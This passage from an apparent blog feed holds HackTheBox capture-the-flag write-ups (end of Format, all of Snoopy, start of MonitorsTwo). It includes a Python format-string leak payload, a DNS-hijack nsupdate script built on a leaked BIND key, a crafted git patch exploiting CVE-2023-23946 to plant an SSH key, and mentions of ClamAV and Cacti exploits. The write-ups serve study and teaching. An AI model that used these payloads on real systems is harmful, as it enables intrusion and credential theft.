</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">deprovision</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"License key deprovisioning coming soon"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="c1">#check
</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"License key valid! Decrypted value:"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"License key invalid"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Taking a close look at the script, it seems to be loading some secret from <code class="language-plaintext highlighter-rouge">/root/license/secret</code> into the variable <code class="language-plaintext highlighter-rouge">secret</code>. It then connects to the redis database and query users depending on the arguments that were passed.</p>

<p>When given the <code class="language-plaintext highlighter-rouge">-p</code> flag followed by a username, the script process it as follows;</p>
<ol>
  <li>Checks to see if the username exist in the redis database. If not, it exit.</li>
  <li>Checks to see if the username is in <code class="language-plaintext highlighter-rouge">/root/license/keys</code>, which seems to be used to store username and license key. If it is, it exits.</li>
  <li>Uses the user’s <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">first-name</code>, and <code class="language-plaintext highlighter-rouge">last-name</code> in a call to <code class="language-plaintext highlighter-rouge">format()</code> to build a string that is later printed.</li>
</ol>

<p>This last point is very interesting because both <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">first-name</code>, and <code class="language-plaintext highlighter-rouge">last-name</code> are values we control, and passing untrusted data to <code class="language-plaintext highlighter-rouge">format()</code> can cause bad things as we could be able to leak data into the string;</p>

<p><img src="/assets/img/Pasted image 20230901222823.png" alt="" /></p>

<p>The only object we will have access to in the context of <code class="language-plaintext highlighter-rouge">format()</code> is <code class="language-plaintext highlighter-rouge">license</code>, which is an instance of the <code class="language-plaintext highlighter-rouge">License</code> class, and doesn’t really have anything interesting. However, all class objects in python has the attribute <code class="language-plaintext highlighter-rouge">__init__.__globals__</code>, which is a dictionary containing key-value mappings of all global objects in it’s scope;</p>

<p><img src="/assets/img/Pasted image 20230901222652.png" alt="" /></p>

<p>Since our <code class="language-plaintext highlighter-rouge">secret</code> variable was defined globally outside of any function, we could leak it by setting any of the values we control that are used in the <code class="language-plaintext highlighter-rouge">format()</code> call to <code class="language-plaintext highlighter-rouge">{license.__init__.__globals__}</code>;</p>

<p><img src="/assets/img/Pasted image 20230901224246.png" alt="" /></p>

<p>This leaked the secret successfully;</p>

<p><img src="/assets/img/Pasted image 20230901224358.png" alt="" /></p>

<p>Using that as a password, I was able to login as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230901224453.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP discovered port <strong>22</strong> (SSH), <strong>80</strong> (Nginx), and <strong>3000</strong> (Gitea)</li>
  <li>Gitea instance has a public repo with containing the full source of the web app</li>
  <li>Exploited an SSRF to query backend redis, and elevate to <strong>pro</strong> user
    <ul>
      <li>Exploited an arbitrary write vulnerability to gain a shell as <code class="language-plaintext highlighter-rouge">www-data</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li>Found creds for a local user  <code class="language-plaintext highlighter-rouge">cooper</code> in the redis database</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">cooper</code>;
    <ul>
      <li>Exploited a call to <code class="language-plaintext highlighter-rouge">format()</code> with user-controlled value in a custom sudo script to leak root password.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="medium" /><category term="web" /><category term="gitea" /><category term="php" /><category term="redis" /><category term="arbitrary write" /><category term="lfi" /><category term="nginx" /><category term="proxy_pass" /><category term="python format string exploit" /><summary type="html"><![CDATA[Format is a nice medium linux machine on HackTheBox. It features a custom web application for creating blogs that is vulnerable to arbitrary read and write, which is easy to detect as the full application source code is accessible in a public Gitea repo. Once inside, you’ll be recovering some creds from the backend redis server, and exploiting a format string vulnerability in a python program to gain root.]]></summary></entry><entry><title type="html">Snoopy - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/snoopy.html" rel="alternate" type="text/html" title="Snoopy - HackTheBox" /><published>2023-09-23T00:00:00+01:00</published><updated>2023-09-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/snoopy</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/snoopy.html"><![CDATA[<p><strong>Snoopy</strong> is a hard-rated linux machine on <em>HackTheBox</em>. It starts with a domain takeover by leaking DNS key to takeover a <em>Mattermost</em> account and exploit a custom command to capture SSH credentials. You’ll then move to another local user by exploiting <strong>CVE-2023-23946</strong> affecting <code class="language-plaintext highlighter-rouge">git apply</code>. Privilege escalation to <code class="language-plaintext highlighter-rouge">root</code> is through <em>ClamAV</em>.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230830210816.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230830210924.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Sat Aug 26 12:34:01 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.212
Nmap scan report for 10.10.11.212
Host is up (0.54s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 26 12:35:09 2023 -- 1 IP address (1 host up) scanned in 68.00 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230830211441.png" alt="" /></p>

<p>The contact page gave a warning regarding <code class="language-plaintext highlighter-rouge">mail.snoopy.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230830213727.png" alt="" /></p>

<p>Attempting to send an email gave an error;</p>

<p><img src="/assets/img/Pasted image 20230830213820.png" alt="" /></p>

<p>Download link on the page reveals the domain name;</p>

<p><img src="/assets/img/Pasted image 20230830212015.png" alt="" /></p>

<p>Clicking the link started a download for a <code class="language-plaintext highlighter-rouge">.zip</code> file;</p>

<p><img src="/assets/img/Pasted image 20230830212516.png" alt="" /></p>

<p>Nothing of much interest was found inside;</p>

<p><img src="/assets/img/Pasted image 20230830212213.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">file</code> parameter looks interesting though. Testing for an LFI, it appears the application is using some filter, and is starting a download for an empty file;</p>

<p><img src="/assets/img/Pasted image 20230830212845.png" alt="" /></p>

<p>Testing for common bypass, I was able to gain LFI by nesting the traversal sequences;</p>

<p><img src="/assets/img/Pasted image 20230830213037.png" alt="" />
<img src="/assets/img/Pasted image 20230830213305.png" alt="" /></p>

<p><br /></p>

<h4 id="dns">DNS</h4>
<p><br /></p>

<p>Now that we have a domain name, we can begin poking at the DNS server. Testing for zone transfer, it seems to be enabled, and I was able to dump some DNS records, which I added to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>

<p><img src="/assets/img/Pasted image 20230830213540.png" alt="" /></p>

<p>Note that <code class="language-plaintext highlighter-rouge">email.snoopy.htb</code> is not here, as hinted in the warning earlier. An instance of <em>Mattermost</em> is running on <code class="language-plaintext highlighter-rouge">mm.snoopy.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230830214217.png" alt="" /></p>

<p>There is a password reset page that accepts email address;</p>

<p><img src="/assets/img/Pasted image 20230830214404.png" alt="" /></p>

<p>This is likely a DNS hijack exercise since the mail domain is currenly unregistered. Testing this with <code class="language-plaintext highlighter-rouge">nsupdate</code> gave an error that’s likely due to lack of creds;</p>

<p><img src="/assets/img/Pasted image 20230830214648.png" alt="" /></p>

<p>NMAP showed the DNS server is <strong>BIND</strong>, which by default has config file at <code class="language-plaintext highlighter-rouge">/etc/bind/named.conf</code>. Dumping this using the LFI, I got a key;</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c1">// This is the primary configuration file for the BIND DNS server named.</span>
<span class="c1">//</span>
<span class="c1">// Please read /usr/share/doc/bind9/README.Debian.gz for information on the </span>
<span class="c1">// structure of BIND configuration files in Debian, *BEFORE* you customize </span>
<span class="c1">// this configuration file.</span>
<span class="c1">//</span>
<span class="c1">// If you are just adding zones, please do that in /etc/bind/named.conf.local</span>

<span class="nx">include</span> <span class="dl">"</span><span class="s2">/etc/bind/named.conf.options</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">include</span> <span class="dl">"</span><span class="s2">/etc/bind/named.conf.local</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">include</span> <span class="dl">"</span><span class="s2">/etc/bind/named.conf.default-zones</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">key</span> <span class="dl">"</span><span class="s2">rndc-key</span><span class="dl">"</span> <span class="p">{</span>
    <span class="nx">algorithm</span> <span class="nx">hmac</span><span class="o">-</span><span class="nx">sha256</span><span class="p">;</span>
    <span class="nx">secret</span> <span class="dl">"</span><span class="s2">BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=</span><span class="dl">"</span><span class="p">;</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>With this key, I wrote a simple script <code class="language-plaintext highlighter-rouge">dns_hijack.py</code> for connecting to the server and adding a new record for the <code class="language-plaintext highlighter-rouge">mail.snoopy.htb</code> and point it to my box;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c1">#!/bin/bash
</span>
<span class="n">echo</span> <span class="s">"[*] Hijacking mail.snoopy.htb"</span>
<span class="n">echo</span> <span class="s">"server 10.10.11.212
key hmac-sha256:rndc-key BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
update add mail.snoopy.htb 86400 A 10.10.16.73
send
quit
"</span> <span class="o">|</span> <span class="n">nsupdate</span>
<span class="n">nslookup</span> <span class="n">mail</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.212</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It worked;</p>

<p><img src="/assets/img/Pasted image 20230830215322.png" alt="" /></p>

<p>Now we need to know some email addresses of potential users. The <em>team</em> section of the main page has a few;</p>

<p><img src="/assets/img/Pasted image 20230830215828.png" alt="" /></p>

<p>I then setup a <a href="https://github.com/VaderZ/fakesmtp">fake SMTP server</a>, execute <code class="language-plaintext highlighter-rouge">dns_hijack.py</code>, and requested a reset for <code class="language-plaintext highlighter-rouge">sbrown@snoopy.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230830220429.png" alt="" /></p>

<p>The email is broken a bit and some <code class="language-plaintext highlighter-rouge">=</code> are added where they shouldn’t be. Also notice the <code class="language-plaintext highlighter-rouge">3D</code> in front of the above token, which is the hex form of <code class="language-plaintext highlighter-rouge">=</code>. The cleaned up token is <code class="language-plaintext highlighter-rouge">nyhndmdhpjozsss39aih1tph6izk3q3iqo1e4ddb3uu7rsxgtqqyupyit4ohpp4a</code>, and I was able to reset the password of <code class="language-plaintext highlighter-rouge">sbrown@snoopy.htb</code> and login;</p>

<p><img src="/assets/img/Pasted image 20230830221018.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>The <em>Town Square</em> channel has some interesting messages;</p>

<p><img src="/assets/img/Pasted image 20230830221215.png" alt="" /></p>

<p>I don’t see any other channel, so I switched to the account of <code class="language-plaintext highlighter-rouge">cbrown</code> using the same exploit;</p>

<p><img src="/assets/img/Pasted image 20230830221451.png" alt="" /></p>

<p>We now have access to the channel, but it’s empty. Checking for channel commands by typing <code class="language-plaintext highlighter-rouge">/</code> in the message field, something stood out;</p>

<p><img src="/assets/img/Pasted image 20230830221628.png" alt="" /></p>

<p>Typing the command opened a dialog. Filling the form and sumitting sent a request to my host;</p>

<p><img src="/assets/img/Pasted image 20230830221837.png" alt="" />
<img src="/assets/img/Pasted image 20230830221855.png" alt="" /></p>

<p><em>Paramiko</em> is a popular python library for doing SSH operations, so I setup a <a href="https://github.com/internetwache/SSH-Honeypot">fake SSH</a> server. This time, we captured some creds;</p>

<p><img src="/assets/img/Pasted image 20230830222101.png" alt="" /></p>

<p>Testing this cred on the box over SSH, I was able to login;</p>

<p><img src="/assets/img/Pasted image 20230830222219.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">cbrown</code> has <code class="language-plaintext highlighter-rouge">sudo</code> perms to run <code class="language-plaintext highlighter-rouge">git apply</code> as the user <code class="language-plaintext highlighter-rouge">sbrown</code>;</p>

<p><img src="/assets/img/Pasted image 20230830222344.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">git apply</code> is a command used to apply git patches, which are generated using <code class="language-plaintext highlighter-rouge">git diff</code>. After some local tests, I was able to craft a path file that could add an SSH key to <code class="language-plaintext highlighter-rouge">.ssh/authorized_keys</code> in sbrown’s home dir;</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>diff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/sbrown/.ssh/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDn76zZKBkOP+bame5OO1cXGsn91xbO5NPO5H4XqCpGIiDqDMA0Vzpqb9MtNHOYu3tqtqDSe9moL3x/X/s9qYTlTvJjM05WJyZ1e1zy6w60GRTx1ZbyTxe4sOFesYFASsUwptnAE9ZK/+ea0OqrB0gbvpgjsmIqgNlTld8FXwV+wkoA9G9KKUzXPeb0ogWNoWRiZLsjdlz0YHqOOO52wXRtasE0HTiWeadP/5xkkjXH8C5hZ+2Vath9+ZOiMmbZFewRG3YryT6uWETHwQCJA4N0vaN2HgUuPO/HoIBvy05fyQPv5M1Tz8rlgiHobdl6/MvhhhYzza4qDJDmGVd+XNbU7xJAZ7Fzx7ekaiVSXy8meS3ScAAbX5DFrvAxx6Z6HwLPGFk1C0hG1/5lYsF0m90PGdhfVmrzNs2+5tVWnc/7MawNEBQ8YnZm7vflo03Va+BEUw3lD1SlXtJj6lAqDf5sAkxvYKerHntFvo/T6xUy17gyuQ6CJPPtgL9esik9kFs= agent47@debian
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230830222914.png" alt="" /></p>

<p>Problem is to be able to use this payload, I need write permission on any of the parent diretories of <code class="language-plaintext highlighter-rouge">/home/sbrown</code>, which are only 2: <code class="language-plaintext highlighter-rouge">/</code>, and <code class="language-plaintext highlighter-rouge">/home</code>, none of which I can write to. This is because the regex applied to the filename is strictly alphanumeric, so I can’t pass a config file stored in another directory. My first thought is to use symbolic links to exploit this, but <code class="language-plaintext highlighter-rouge">git</code> is not allowing it;</p>

<p><img src="/assets/img/Pasted image 20230830223401.png" alt="" /></p>

<p>Further googling lead me to this <a href="https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/">advisory</a>, which mentions <strong>CVE-2023-23946</strong> for exploiting <code class="language-plaintext highlighter-rouge">git apply</code> using symbolic links. No PoC seems to be available for this, but the <a href="https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd#diff-8273385c4a17d688bbbd5f8297c84241a174c6e6aea289370b57294fd988eaa6">patch commit</a> showed some test code used to test if the patch was successful;</p>

<p><img src="/assets/img/Pasted image 20230830223835.png" alt="" /></p>

<p>This was enough to build an exploit that would drop an SSH key into the home directory of <code class="language-plaintext highlighter-rouge">sbrown</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>diff <span class="nt">--git</span> a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
<span class="nt">--</span>
diff <span class="nt">--git</span> /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
<span class="nt">---</span> /dev/null
+++ b/renamed-symlink/authorized_keys
@@ <span class="nt">-0</span>,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDn76zZKBkOP+bame5OO1cXGsn91xbO5NPO5H4XqCpGIiDqDMA0Vzpqb9MtNHOYu3tqtqDSe9moL3x/X/s9qYTlTvJjM05WJyZ1e1zy6w60GRTx1ZbyTxe4sOFesYFASsUwptnAE9ZK/+ea0OqrB0gbvpgjsmIqgNlTld8FXwV+wkoA9G9KKUzXPeb0ogWNoWRiZLsjdlz0YHqOOO52wXRtasE0HTiWeadP/5xkkjXH8C5hZ+2Vath9+ZOiMmbZFewRG3YryT6uWETHwQCJA4N0vaN2HgUuPO/HoIBvy05fyQPv5M1Tz8rlgiHobdl6/MvhhhYzza4qDJDmGVd+XNbU7xJAZ7Fzx7ekaiVSXy8meS3ScAAbX5DFrvAxx6Z6HwLPGFk1C0hG1/5lYsF0m90PGdhfVmrzNs2+5tVWnc/7MawNEBQ8YnZm7vflo03Va+BEUw3lD1SlXtJj6lAqDf5sAkxvYKerHntFvo/T6xUy17gyuQ6CJPPtgL9esik9kFs<span class="o">=</span> agent47@debian
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I uploaded it to <code class="language-plaintext highlighter-rouge">/dev/shm/patch</code> and created a symlink to <code class="language-plaintext highlighter-rouge">/home/sbrown/.ssh</code> as <code class="language-plaintext highlighter-rouge">symlink</code>;</p>

<p><img src="/assets/img/Pasted image 20230830224340.png" alt="" /></p>

<p>The patch applied successfully, and I was able to login;</p>

<p><img src="/assets/img/Pasted image 20230830224431.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>User <code class="language-plaintext highlighter-rouge">sbrown</code> has sudo permissions to run <code class="language-plaintext highlighter-rouge">clamscan</code>, which is the utility for ClamAV for running virus scan on the filesystem. Searching for known vulnerabilities lead me to <a href="https://onekey.com/blog/clamav-critical-patch-review/">this blog</a>, which mentioned <strong>CVE-2023-20052</strong>. Using this <a href="https://github.com/nokn0wthing/CVE-2023-20052">PoC</a>, I was able to generate a <code class="language-plaintext highlighter-rouge">.dmg</code> file that loads <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>, which gave me the root SSH key;</p>

<p><img src="/assets/img/Pasted image 20230830225117.png" alt="" />
<img src="/assets/img/Pasted image 20230830225210.png" alt="" />
<img src="/assets/img/Pasted image 20230830225304.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP showed port <strong>22</strong>, <strong>53</strong>, and <strong>80</strong></li>
  <li>Exploited an LFI on the website to leak the key of <strong>BIND</strong></li>
  <li>Hijacked the mail domain for account takeover on <em>Mattermost</em>;
    <ul>
      <li>Exploit a custom command to capture SSH creds of <code class="language-plaintext highlighter-rouge">cbrown</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">cbrown</code>;
    <ul>
      <li>Exploited <strong>CVE-2023-23946</strong> (git apply) to gain access to <code class="language-plaintext highlighter-rouge">sbrown</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">sbrown</code>;
    <ul>
      <li>Exploited <em>ClamAV</em> (<strong>CVE-2023-20052</strong>) to leak root SSH key.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="hard" /><category term="linux" /><category term="web" /><category term="dns" /><category term="bind" /><category term="lfi" /><category term="domain takeover" /><category term="account takeover" /><category term="mattermost" /><category term="paramiko" /><category term="git" /><category term="git apply" /><category term="clamscan" /><category term="clamav" /><category term="CVE-2023-20052" /><summary type="html"><![CDATA[Snoopy is a hard-rated linux machine on HackTheBox. It starts with a domain takeover by leaking DNS key to takeover a Mattermost account and exploit a custom command to capture SSH credentials. You’ll then move to another local user by exploiting CVE-2023-23946 affecting git apply. Privilege escalation to root is through ClamAV.]]></summary></entry><entry><title type="html">MonitorsTwo - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/monitorstwo.html" rel="alternate" type="text/html" title="MonitorsTwo - HackTheBox" /><published>2023-09-02T00:00:00+01:00</published><updated>2023-09-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/monitorstwo</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/monitorstwo.html"><![CDATA[<p><strong>MonitorsTwo</strong> is an easy linux box that starts with exploiting a vulnerable instance of <em>Cacti</em> to gain a shell on the box. This drops you into a docker container that has SUID set on <code class="language-plaintext highlighter-rouge">capsh</code>, which allows for easy privesc. You then move laterally to the main host by cracking a hash obtained from a local MySQL server, and then exploit CVE-2021-41091 to gain root on the box.</p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230830125522.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230830125558.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Aug  2 06:22:06 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.211
Nmap scan report for 10.10.11.211
Host is up (0.60s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug  2 06:23:17 2023 -- 1 IP address (1 host up) scanned in 70.81 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Site is running <em>Cacti v1.2.22</em>;</p>

<p><img src="/assets/img/Pasted image 20230830130033.png" alt="" /></p>

<p>Quick search showed it’s vulnerable to <a href="https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf"><strong>CVE-2022-46169</strong></a>. PoC found in <a href="https://github.com/N1arut/CVE-2022-46169_POC">this repo</a>. The exploit errored out after a while;</p>

<p><img src="/assets/img/Pasted image 20230830130836.png" alt="" /></p>

<p>So I modified the script to go through my proxy to see what’s up. The exploit is bruteforcing the <code class="language-plaintext highlighter-rouge">local_data_ids</code> parameter;</p>

<p><img src="/assets/img/Pasted image 20230830132815.png" alt="" /></p>

<p>So I setup a numeric bruteforce on the field;</p>

<p><img src="/assets/img/Pasted image 20230830133040.png" alt="" /></p>

<p>Running it, we got a few interesting results;</p>

<p><img src="/assets/img/Pasted image 20230830133257.png" alt="" /></p>

<p>From the code, the output of <code class="language-plaintext highlighter-rouge">finding_id()</code> is what’s passed to the <code class="language-plaintext highlighter-rouge">rev_shell()</code> function, which appends the payload to the URL parameter <code class="language-plaintext highlighter-rouge">poller_id</code>;</p>

<p><img src="/assets/img/Pasted image 20230830133550.png" alt="" /></p>

<p>Testing this in the replay tab, I got code execution;</p>

<p><img src="/assets/img/Pasted image 20230830134246.png" alt="" />
<img src="/assets/img/Pasted image 20230830134212.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>Python not installed locally, so used <code class="language-plaintext highlighter-rouge">script /dev/null -qc /bin/bash</code> for TTY upgrade. Presence of <code class="language-plaintext highlighter-rouge">/.dockerenv</code> indicates we are in a container. MySQL creds found in <code class="language-plaintext highlighter-rouge">/var/www/html/include/config.php</code>;</p>

<p><img src="/assets/img/Pasted image 20230830135203.png" alt="" />
<img src="/assets/img/Pasted image 20230830135315.png" alt="" /></p>

<p>Cacti uses <code class="language-plaintext highlighter-rouge">user_auth</code> table to store user creds;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>MySQL [cacti]&gt; describe user_auth;
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
| full_name              | varchar(100)          | YES  |     | 0       |                |
| email_address          | varchar(128)          | YES  |     | NULL    |                |
| must_change_password   | char(2)               | YES  |     | NULL    |                |
| password_change        | char(2)               | YES  |     | on      |                |
| show_tree              | char(2)               | YES  |     | on      |                |
| show_list              | char(2)               | YES  |     | on      |                |
| show_preview           | char(2)               | NO   |     | on      |                |
| graph_settings         | char(2)               | YES  |     | NULL    |                |
| login_opts             | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_graphs          | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_trees           | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_hosts           | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_graph_templates | tinyint(3) unsigned   | NO   |     | 1       |                |
| enabled                | char(2)               | NO   | MUL | on      |                |
| lastchange             | int(11)               | NO   |     | -1      |                |
| lastlogin              | int(11)               | NO   |     | -1      |                |
| password_history       | varchar(4096)         | NO   |     | -1      |                |
| locked                 | varchar(3)            | NO   |     |         |                |
| failed_attempts        | int(5)                | NO   |     | 0       |                |
| lastfail               | int(10) unsigned      | NO   |     | 0       |                |
| reset_perms            | int(10) unsigned      | NO   |     | 0       |                |
+------------------------+-----------------------+------+-----+---------+----------------+
25 rows in set (0.001 sec)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Found 2 hashes;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>MySQL [cacti]&gt; select username, password from user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
